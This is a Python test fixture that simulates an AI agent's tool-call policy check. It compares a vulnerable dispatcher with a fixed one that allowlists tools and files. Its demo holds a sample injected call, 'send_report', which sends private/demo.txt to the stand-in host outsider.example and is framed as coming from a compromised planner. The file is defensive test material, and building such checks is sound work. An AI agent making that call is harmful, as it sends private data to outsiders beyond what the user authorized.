"""Deterministic malicious tool-call fixture, not a live LLM or prompt-injection benchmark."""
import json

ALLOWED_FILES = {"notes/summary.txt"}


def dispatch(call, *, fixed):
    """Records a simulated action only. Never reads files, sends messages or contacts a host."""
    if not isinstance(call, dict) or set(call) != {"tool", "arguments"}:
        return {"allowed": False, "reason": "invalid envelope"}
    args = call["arguments"]
    if fixed:
        if call["tool"] != "read_note" or not isinstance(args, dict) or set(args) != {"path"}:
            return {"allowed": False, "reason": "tool/argument policy"}
        if not isinstance(args["path"], str) or args["path"] not in ALLOWED_FILES:
            return {"allowed": False, "reason": "resource policy"}
    return {"allowed": True, "simulated_action": call}


def demo():
    malicious = {"tool": "send_report", "arguments": {"path": "private/demo.txt", "recipient": "outsider.example"}}
    legitimate = {"tool": "read_note", "arguments": {"path": "notes/summary.txt"}}
    before, after = dispatch(malicious, fixed=False), dispatch(malicious, fixed=True)
    return {"attack": "A compromised planner proposes a tool outside the user-authorized task",
            "injected_tool_call": malicious, "vulnerable_accepts": before["allowed"],
            "fixed_accepts": after["allowed"], "legitimate_accepts": dispatch(legitimate, fixed=True)["allowed"],
            "before": before, "after": after,
            "boundary": "Policy simulation: no model inference, real tool execution or data transmission"}


if __name__ == "__main__":
    print(json.dumps(demo(), indent=2))
